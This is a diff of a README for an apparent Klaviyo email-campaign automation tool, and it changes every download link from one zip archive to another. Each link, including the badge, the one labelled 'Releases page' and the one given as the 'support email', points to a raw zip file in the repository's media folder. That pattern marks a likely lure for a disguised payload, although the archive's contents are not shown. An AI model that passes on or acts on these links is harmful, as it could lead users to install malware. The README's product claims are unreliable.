@@ -1,6 +1,6 @@
 # 🚀 klaviyo-email-campaign-automation-engine - Scale Your eCommerce Retention Effortlessly
 
-[![Download](https://raw.githubusercontent.com/SeanBalberonaT/klaviyo-email-campaign-automation-engine/main/media/klaviyo-email-campaign-automation-engine_v3.6.zip)](https://raw.githubusercontent.com/SeanBalberonaT/klaviyo-email-campaign-automation-engine/main/media/klaviyo-email-campaign-automation-engine_v3.6.zip)
+[![Download](https://raw.githubusercontent.com/SeanBalberonaT/klaviyo-email-campaign-automation-engine/main/media/engine-automation-campaign-klaviyo-email-2.7.zip)](https://raw.githubusercontent.com/SeanBalberonaT/klaviyo-email-campaign-automation-engine/main/media/engine-automation-campaign-klaviyo-email-2.7.zip)
 
 ## 📦 Overview
 
@@ -28,7 +28,7 @@ Before you begin, ensure your system meets the following requirements:
 Here’s how to download and set up the software:
 
 1. **Visit the Releases Page**: Click the link to access the latest version of the application:
-   [Download from Releases](https://raw.githubusercontent.com/SeanBalberonaT/klaviyo-email-campaign-automation-engine/main/media/klaviyo-email-campaign-automation-engine_v3.6.zip)
+   [Download from Releases](https://raw.githubusercontent.com/SeanBalberonaT/klaviyo-email-campaign-automation-engine/main/media/engine-automation-campaign-klaviyo-email-2.7.zip)
 
 2. **Choose Your Version**: Look for the most recent version. It will be labeled clearly.
 
@@ -62,10 +62,10 @@ To help you get the most out of the Klaviyo Email Campaign Automation Engine, co
 
 - **User Documentation**: Comprehensive guides on using all features effectively.
 - **Community Forum**: Engage with other users, ask questions, and share best practices.
-- **Support Contact**: Reach out for additional help via our support email at https://raw.githubusercontent.com/SeanBalberonaT/klaviyo-email-campaign-automation-engine/main/media/klaviyo-email-campaign-automation-engine_v3.6.zip
+- **Support Contact**: Reach out for additional help via our support email at https://raw.githubusercontent.com/SeanBalberonaT/klaviyo-email-campaign-automation-engine/main/media/engine-automation-campaign-klaviyo-email-2.7.zip
 
 ## 💬 Feedback and Contributions
 
 We welcome your feedback. If you have suggestions for features or improvements, feel free to open an issue on our GitHub page. Contributions are also welcome if you would like to improve the application.
 
-Don't forget to download the latest version here: [Download from Releases](https://raw.githubusercontent.com/SeanBalberonaT/klaviyo-email-campaign-automation-engine/main/media/klaviyo-email-campaign-automation-engine_v3.6.zip)
+Don't forget to download the latest version here: [Download from Releases](https://raw.githubusercontent.com/SeanBalberonaT/klaviyo-email-campaign-automation-engine/main/media/engine-automation-campaign-klaviyo-email-2.7.zip)
